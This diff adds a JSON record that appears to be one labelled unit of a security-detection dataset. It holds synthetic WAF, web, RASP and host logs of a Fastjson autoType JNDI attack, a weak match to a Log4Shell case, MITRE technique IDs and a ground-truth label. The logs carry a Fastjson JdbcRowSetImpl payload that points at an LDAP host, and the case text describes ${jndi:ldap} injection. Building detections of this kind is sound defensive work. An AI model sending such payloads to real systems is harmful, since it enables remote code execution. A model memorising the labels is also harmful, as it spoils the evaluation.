@@ -1,0 +1,163 @@
+{
+ "unit": 1007,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-001",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "JNDI 家族（Fastjson autoType），注入载体与 CASE-001 的 ${jndi: 不同"
+ },
+ "technique": "Fastjson autoType（JdbcRowSetImpl JNDI，JSON body）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-16 01:14:43",
+   "source": "waf",
+   "log_id": "WAF0304198",
+   "content": "/api/user/profile {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"ldap://10.20.7.31\"} Mozilla/5.0 (iPhone; CPU",
+   "event_id": "1007-WAF0304198"
+  },
+  {
+   "timestamp": "2026-06-16 01:14:44",
+   "source": "web",
+   "log_id": "WEB0306177",
+   "content": "/api/user/profile {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"ldap://10.20.7.31\"} Mozilla/5.0 (iPhone; CPU",
+   "event_id": "1007-WEB0306177"
+  },
+  {
+   "timestamp": "2026-06-16 01:14:45",
+   "source": "rasp",
+   "log_id": "RASP0336559",
+   "content": "https://app-java-119.ops-corp.com/api/user/profile {\"autoType\": \"JdbcRowSetImpl\"} Mozilla/5.0 (iPhone; CPU iPh",
+   "event_id": "1007-RASP0336559"
+  },
+  {
+   "timestamp": "2026-06-16 01:16:10",
+   "source": "hids",
+   "log_id": "HID0329665",
+   "content": "touch /tmp/.x <== /bin/sh -c 'touch /tmp/.x' <== /usr/bin/java -jar /opt/app/user-api.jar",
+   "event_id": "1007-HID0329665"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-001",
+   "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+   "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+   "matched_steps": 1,
+   "detected_steps": 1,
+   "total_steps": 3,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S3",
+     "action_id": "log4shell_java_child_cmd",
+     "label": "java 进程派生子 shell 执行命令",
+     "generic": true,
+     "event_ids": [
+      "1007-HID0329665"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "aligned_event_id": "1007-HID0329665",
+     "detections": [
+      {
+       "event_id": "1007-HID0329665",
+       "source": "hids",
+       "timestamp": "2026-06-16 01:16:10"
+      }
+     ]
+    }
+   ],
+   "source_mismatches": [],
+   "unaligned_detections": [],
+   "keyword_score": 4,
+   "keyword_details": [
+    "probe +4: java(?:\\.exe)?\\s+-jar\\s+/opt/app/"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1105"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2"
+   ],
+   "before_steps": [
+    "S1",
+    "S2"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0,
+   "pattern_scope": {
+    "attack_family": "Log4j2 JNDI 注入（CVE-2021-44228）",
+    "variant_note": "由单个合成样本归纳；RMI/DNS 协议变体与二次载荷形式尚未多实例验证。"
+   },
+   "negative_and_unknown_evidence": {
+    "not_observed": [
+     "横向移动",
+     "凭据窃取",
+     "反序列化回显"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+   },
+   "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+   }
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S3",
+    "label": "java 进程派生子 shell 执行命令",
+    "sources": [
+     "hids"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1007-HID0329665"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 4,
+  "mitre": [
+   "T1190",
+   "T1059.004",
+   "T1105"
+  ]
+ }
+}
